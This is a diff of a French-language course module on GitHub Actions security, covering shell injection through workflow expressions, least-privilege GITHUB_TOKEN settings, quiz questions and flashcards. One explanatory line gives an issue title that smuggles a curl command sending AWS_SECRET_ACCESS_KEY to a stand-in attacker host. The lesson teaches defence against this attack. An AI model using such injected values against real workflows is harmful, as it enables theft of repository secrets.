@@ -20,7 +20,7 @@ module.exports = {
     'concevoir des matrices d’exécution (strategy.matrix) pour valider le code sur plusieurs systèmes d’exploitation et versions de langages ;',
     'identifier et neutraliser les failles critiques d’injection de commande shell dans les contextes dynamiques ${{ github.event... }} ;',
     'appliquer le principe du moindre privilège aux tokens d’authentification automatiques (GITHUB_TOKEN) via le bloc permissions ;',
-    'développer en Python 3 des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.'
+    'développer en scripts Bash et commandes Git des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.'
   ],
   sections: [
     {
@@ -70,8 +70,9 @@ module.exports = {
           '<p>Comme GitHub Actions résout l’expression <code>\${{ ... }}</code> par substitution textuelle brute <strong>avant</strong> de passer le script au shell bash, un attaquant qui soumet une issue avec le titre suivant :</p>',
           '<pre><code>Test"; curl -s https://evil.attacker/exfil?token=$AWS_SECRET_ACCESS_KEY; echo "Fin</code></pre>',
           '<p>provoquera l’exécution directe de la commande arbitraire <code>curl</code> dans le runner, exfiltrant les secrets du dépôt !</p>',
-          '<p><strong>Remédiation obligatoire :</strong> Toujours passer les entrées non fiables par des <strong>variables d’environnement intermédiaires</strong> :</p>',
-          '<pre><code>- name: Traitement securise\n  env:\n    ISSUE_TITLE: \${{ github.event.issue.title }}\n  run: echo "Nouveau titre : \$ISSUE_TITLE"</code></pre>'
+          '<p><strong>Réduction du risque :</strong> transmettre la valeur non fiable par une variable d’environnement intermédiaire évite son insertion textuelle directe dans le script :</p>',
+          '<pre><code>- name: Traiter le titre\n  env:\n    ISSUE_TITLE: \${{ github.event.issue.title }}\n  run: printf \'%s\\n\' "\$ISSUE_TITLE"</code></pre>',
+          '<p>Cette technique ne garantit pas tous les usages : placer les expansions entre guillemets, valider les arguments selon la commande appelée et ne jamais réinterpréter la donnée avec <code>eval</code>. Utiliser un séparateur d’options lorsque la commande le prend en charge.</p>'
         ])
       ].join('\n')
     },
@@ -135,7 +136,7 @@ module.exports = {
     'Principe du moindre privilège & GITHUB_TOKEN'
   ],
   pitfalls: [
-    'Écrire ${{ github.head_ref }} ou ${{ github.event... }} directement dans un script bash exécuté dans run:.',
+    'Écrire <code>${{ github.head_ref }}</code> ou <code>${{ github.event... }}</code> directement dans un script bash exécuté dans run:.',
     'Laisser les permissions par défaut en lecture/écriture complète pour le GITHUB_TOKEN sur tous les dépôts.',
     'Faire un echo d’un secret dans un fichier temporaire qui est ensuite archivé comme artifact public du workflow.',
     'Oublier le drapeau fail-fast: false lorsqu’on souhaite obtenir le rapport de test complet sur tous les OS.'
@@ -178,12 +179,12 @@ module.exports = {
       stem: 'Quelle est la méthode recommandée pour assainir l’utilisation d’un paramètre dynamique issu de l’événement GitHub dans un script shell ?',
       opts: [
         'L’encoder en base64 dans le message de commit',
-        'Le déclarer dans le bloc « env: » de l’étape et manipuler la variable d’environnement correspondante dans le script',
+        'Le transmettre via « env: », citer l’expansion et valider la valeur selon son usage',
         'Désactiver l’interpréteur bash au profit de sh standard',
         'Exécuter le workflow uniquement sur des machines Windows'
       ],
       correct: 1,
-      exp: 'En passant la valeur via le bloc env: (ex: BRANCH: ${{ github.head_ref }}), le moteur transmet la donnée comme valeur d’environnement et le shell ne tente pas de l’interpréter comme du code exécutable.'
+      exp: 'Le bloc env: évite la substitution directe dans le script, mais ne sécurise pas automatiquement tous les usages : citer l’expansion, valider les arguments et éviter eval.'
     },
     {
       stem: 'Que produit la directive « strategy.matrix » avec os: [ubuntu, windows] et node: [18, 20] ?',
@@ -244,8 +245,8 @@ module.exports = {
       a: 'Parce que GitHub remplace le texte avant l’exécution : des métacaractères insérés par un attaquant dans un titre d’issue ou de branche peuvent détourner le script shell (Command Injection).'
     },
     {
-      q: 'Comment immuniser un script shell contre l’injection de contexte GitHub ?',
-      a: 'En passant la valeur dynamique via le bloc env: du step, puis en utilisant la variable d’environnement ($MA_VAR) dans le script.'
+      q: 'Comment une variable d’environnement réduit-elle le risque d’injection de contexte GitHub ?',
+      a: 'La transmission par env: évite la substitution directe mais ne garantit pas tous les usages : mettre l’expansion entre guillemets, valider les arguments et éviter eval.'
     },
     {
       q: 'À quoi sert la directive permissions: en tête de workflow ?',
